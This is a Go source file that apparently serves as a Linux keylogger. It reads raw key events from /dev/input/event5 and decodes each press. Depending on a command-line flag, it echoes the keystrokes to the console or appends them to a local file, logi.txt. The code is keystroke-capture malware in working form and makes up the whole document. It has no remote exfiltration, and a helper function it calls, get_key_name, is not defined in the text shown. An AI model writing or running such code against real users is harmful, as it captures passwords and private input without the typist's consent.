package main

import(
	"fmt"
	"os"
	"flag"
	"encoding/binary"
)

func main() {
	dir := flag.String("D", "/dev/input/event5", "Linux keyboard inputs file dir")
	mode := flag.Int("c", 1, "Tells the program if input should be written in console or file")
	flag.Parse()
	// dir := "/dev/input/event5"
	fd, err := os.Open(*dir)
	if err != nil {
		fmt.Println("Error when opening file ", err)
		return
	}

	defer fd.Close()

	b := make([]byte, 24) // 24 byte struct input_event

	// C represantation of /dev/input/event* layout
	// struct input_event {
	// 	struct timeval time;
	// 	unsigned short type;
	// 	unsigned short code;
	// 	unsigned int value;
	// };
	
	switch *mode {
	case 1:
		for {
			fd.Read(b)
			typ := binary.LittleEndian.Uint16(b[16:18]) // skip first 16 bytes representing time
			code := binary.LittleEndian.Uint16(b[18:20])
			value := int32(binary.LittleEndian.Uint32(b[20:24]))
			if typ == 1 && value == 1{
				fmt.Printf("%s", get_key_name(code))
			}
		}
	default:
		output, err := os.OpenFile("logi.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
		if err != nil {
			fmt.Println("Error when opening output file ", err)
			return
		}
		defer output.Close()
		for {
			fd.Read(b)
			typ := binary.LittleEndian.Uint16(b[16:18]) // skip first 16 bytes representing time
			code := binary.LittleEndian.Uint16(b[18:20])
			value := int32(binary.LittleEndian.Uint32(b[20:24]))
			if typ == 1 && value == 1{
				fmt.Fprintf(output, "%s", get_key_name(code))
			}
		}
	}
	
		
}
